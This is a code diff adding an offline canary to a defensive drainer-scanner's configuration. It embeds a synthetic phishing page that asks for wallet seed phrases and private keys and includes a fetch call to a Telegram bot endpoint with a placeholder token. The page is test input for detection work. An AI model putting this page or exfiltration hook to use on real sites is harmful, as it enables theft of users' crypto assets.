@@ -187,5 +187,32 @@ export const OUT_DIR = fileURLToPath(new URL('../../../out', import.meta.url));
 // ── misc ────────────────────────────────────────────────────────────────────
 export const USER_AGENT =
   'no-place-for-drainers/1.0 (defensive security research; abuse reporting)';
-/** Injected every run to prove the pipeline still works end to end. */
+/** Injected every run to prove acquisition works end to end. Probed first. */
 export const CANARY_URLS = ['https://defixs-finance.vercel.app'];
+
+/**
+ * The offline canary: a synthetic page run through extraction, rules and the
+ * LLM with no network at all.
+ *
+ * The live canary can only report on a run where its provider answered us. When
+ * vercel blocks the runner it goes unprobed, and "canary missed" then means
+ * either "the scanner is broken" or "vercel said no" — two states that need
+ * opposite responses. This one is always reachable, so the two questions
+ * separate: can we still recognise a drainer, and separately, can we still
+ * reach any.
+ */
+export const OFFLINE_CANARY_HTML = `<!doctype html><html><head>
+<title>Wallet Sync — Restore Access</title>
+<meta name="description" content="Validate your wallet to restore access to your assets.">
+</head><body>
+<h1>Irregular balance detected</h1>
+<p>Connect your wallet to rectify the issue and claim your airdrop.</p>
+<button>MetaMask</button><button>Trust Wallet</button><button>Coinbase Wallet</button>
+<form>
+<label>Secret Recovery Phrase</label>
+<input name="seedPhrase" placeholder="Enter your 12 or 24-word recovery phrase">
+<label>Private Key</label>
+<input name="privateKey" type="password" placeholder="Enter your private key">
+</form>
+<script>fetch('https://api.telegram.org/bot123456789:AAxxxxxxxx/sendMessage?chat_id=1', {method:'POST'});</script>
+</body></html>`;
